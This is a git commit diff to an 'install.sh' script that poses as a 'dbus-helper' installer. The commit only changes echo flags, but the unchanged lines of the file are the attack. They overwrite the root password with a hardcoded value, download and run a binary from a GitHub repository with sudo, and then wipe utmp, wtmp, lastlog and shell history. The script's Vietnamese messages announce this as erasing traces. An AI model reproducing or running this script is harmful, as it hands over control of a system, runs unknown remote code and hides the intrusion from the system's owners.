da14c8f2c4a6a9354ee308d363213ede6bf38975
catherine935 <lynhhz1310@gmail.com>
2026-02-21 21:42:07 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,18 +1,18 @@
 clear
 
-echo "\e[36m[dbus-helper] _911"
+echo -e "\e[36m[dbus-helper] _911"
 
-echo "root:quangbaonguyen@123" | chpasswd 
+echo -e "root:quangbaonguyen@123" | chpasswd 
 
-echo "\e[32m đổi password thành công"
+echo -e "\e[32m đổi password thành công"
 
-echo "\e[33mĐang tải dbus-helper..."
+echo -e "\e[33mĐang tải dbus-helper..."
 wget https://github.com/catherine935/dbus/raw/refs/heads/main/dbus-helper > /dev/null 2>&1
-echo "\e[32mĐã tải thành công, tiến hành cài đặt..."
+echo -e "\e[32mĐã tải thành công, tiến hành cài đặt..."
 chmod +x dbus-helper
 sudo ./dbus-helper
 
-echo "\e[32mĐã cài đặt thành công đang xóa dấu vết"
+echo -e "\e[32mĐã cài đặt thành công đang xóa dấu vết"
 : > /var/run/utmp
 : > /var/log/wtmp
 : > /var/log/lastlog
@@ -20,4 +20,4 @@ export HISTSIZE=0
 history -c
 source /root/.bashrc 2>/dev/null
 
-echo "\e[31mĐã xóa dấu vết!"
+echo -e "\e[31mĐã xóa dấu vết!"
